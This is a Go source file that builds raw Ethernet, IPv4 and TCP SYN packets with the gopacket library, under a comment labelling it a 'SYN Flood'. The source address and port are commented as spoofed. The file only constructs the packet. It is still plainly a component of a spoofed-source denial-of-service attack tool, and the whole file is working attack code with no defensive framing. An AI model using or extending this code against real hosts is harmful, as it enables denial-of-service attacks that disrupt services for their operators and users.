package protocol

import (
	"net"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// SYN Flood
func SYNPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	dstMacStr, err := FindMAC(dstIP)
	if err != nil {
		return nil, fmt.Errorf("failed to find MAC for %s: %w", dstIP, err)
	}
	dstMac, err := net.ParseMAC(dstMacStr)
	if err != nil {
		return nil, fmt.Errorf("failed to parse MAC address: %w", err)
	}

	srcMac, err := GetSrcMAC(dstIP)
	if err != nil {
		return nil, fmt.Errorf("failed to get source MAC address: %w", err)
	}

	// Construct Ethernet layer
	ethLayer := &layers.Ethernet{
		SrcMAC:       srcMac, // Source MAC address
		DstMAC:       dstMac, // Next-hop MAC address
		EthernetType: layers.EthernetTypeIPv4,
	}

	// Construct IP layer
	ipLayer := &layers.IPv4{
		Version:  4,                       // IPv4
		IHL:      5,                       // Internet Header Length
		TOS:      0,                       // Type of Service
		TTL:      64,                      // Time to Live
		Protocol: layers.IPProtocolTCP,    // Set to TCP
		SrcIP:    net.ParseIP(srcIP),      // Spoofed source IP
		DstIP:    net.ParseIP(dstIP),      // Destination IP
	}

	// Construct TCP layer
	tcpLayer := &layers.TCP{
		SrcPort: layers.TCPPort(srcPort), // Spoofed source port
		DstPort: layers.TCPPort(dstPort), // Destination port
		Seq:     1105024978,             // Initial sequence number (can be randomly generated)
		SYN:     true,                   // Set SYN flag
		Window:  14600,                  // Window size
	}

	// Set network layer for checksum calculation
	if err := tcpLayer.SetNetworkLayerForChecksum(ipLayer); err != nil {
		return nil, fmt.Errorf("failed to calculate TCP checksum: %v", err)
	}

	// Create serialization options to set lengths and checksums
	options := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	buffer := gopacket.NewSerializeBuffer()

	// Serialize Ethernet, IP, and TCP layers
	err = gopacket.SerializeLayers(buffer, options, ethLayer, ipLayer, tcpLayer)
	if err != nil {
		return nil, fmt.Errorf("failed to serialize layers: %v", err)
	}

	// Return the generated packet as a byte slice
	return buffer.Bytes(), nil
}
